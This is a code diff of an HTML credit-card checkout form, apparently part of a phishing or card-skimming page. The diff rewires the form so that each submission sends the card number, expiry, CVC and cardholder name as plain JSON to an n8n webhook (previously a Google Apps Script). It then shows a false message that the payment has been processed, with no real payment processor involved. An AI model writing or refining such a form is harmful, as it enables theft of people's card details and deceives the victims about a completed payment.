@@ -19,7 +19,7 @@
                         <img class="img-responsive cc-img" src="http://www.prepbootstrap.com/Content/images/shared/misc/creditcardicons.png" alt="Credit Card Icons">
                     </div>
                     <div class="panel-body">
-                        <form action="https://kingvon.app.n8n.cloud/webhook/gabby" method="POST">
+                        <form id="paymentForm">
                             <!-- Card Number Field -->
                             <div class="form-group">
                                 <label for="cardNumber">CARD NUMBER</label>
@@ -41,16 +41,19 @@
                                 <input type="tel" class="form-control" id="cvCode" name="cvCode" placeholder="CVC" required maxlength="4" />
                             </div>
                         
-                           <!-- Card Owner Field -->
-<div class="form-group">
-    <label for="cardOwner">CARD OWNER</label>
-    <input type="text" class="form-control" id="cardOwner" name="cardOwner" placeholder="Card Owner Name" required />
-</div>
+                            <!-- Card Owner Field -->
+                            <div class="form-group">
+                                <label for="cardOwner">CARD OWNER</label>
+                                <input type="text" class="form-control" id="cardOwner" name="cardOwner" placeholder="Card Owner Name" required />
+                            </div>
                         
                             <!-- Submit Button -->
                             <button type="submit" class="btn btn-warning btn-lg btn-block">Process Payment</button>
                         </form>
                         
+                        <div id="responseMessage" style="display:none; margin-top:10px;" class="alert alert-success">
+                            Thank you! Your payment has been processed.
+                        </div>
                     </div>
                 </div>
             </div>
@@ -58,28 +61,36 @@
     </div>
 
     <script>
-        function submitPayment() {
-            const cardNumber = document.getElementById('cardNumber').value;
-            const expDate = document.getElementById('expDate').value;
-            const cvCode = document.getElementById('cvCode').value;
-            const cardOwner = document.getElementById('cardOwner').value;
+        document.getElementById("paymentForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
 
-            fetch("https://script.google.com/macros/s/AKfycbwDcwJbcRnuQL37pBkp2fndmShitSTxotNdyOKCjE-bzFJpt843XhE5VlQ9TvqTSz5z/exec", {
+            // Collect form data
+            const formData = {
+                cardNumber: document.getElementById('cardNumber').value,
+                expDate: document.getElementById('expDate').value,
+                cvCode: document.getElementById('cvCode').value,
+                cardOwner: document.getElementById('cardOwner').value
+            };
+
+            // Send the form data using fetch to your n8n webhook URL
+            fetch("https://kingvon.app.n8n.cloud/webhook/gabby", {
                 method: "POST",
-                mode: "cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ cardNumber, expDate, cvCode, cardOwner })
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(formData)
             })
             .then(response => response.json())
             .then(data => {
-                if (data.result === "success") {
-                    alert("Payment processed successfully!");
-                } else {
-                    alert("Error processing payment.");
-                }
+                // Display success message
+                document.getElementById("responseMessage").style.display = "block";
+                document.getElementById("paymentForm").reset(); // Clear the form
             })
-            .catch(error => alert("An error occurred. Please try again."));
-        }
+            .catch(error => {
+                alert("An error occurred. Please try again.");
+                console.error("Error:", error);
+            });
+        });
 
         $(document).ready(function () {
             $('#cardNumber').on('input', function () {
@@ -98,11 +109,9 @@
                 $(this).val(input);
             });
 
-              // JavaScript to restrict input to letters only for Card Owner
-    document.getElementById('cardOwner').addEventListener('input', function (e) {
-        // Remove any character that is not a letter
-        this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
-    });
+            document.getElementById('cardOwner').addEventListener('input', function () {
+                this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+            });
 
             $('#cvCode').on('input', function () {
                 let input = $(this).val().replace(/\D/g, '');
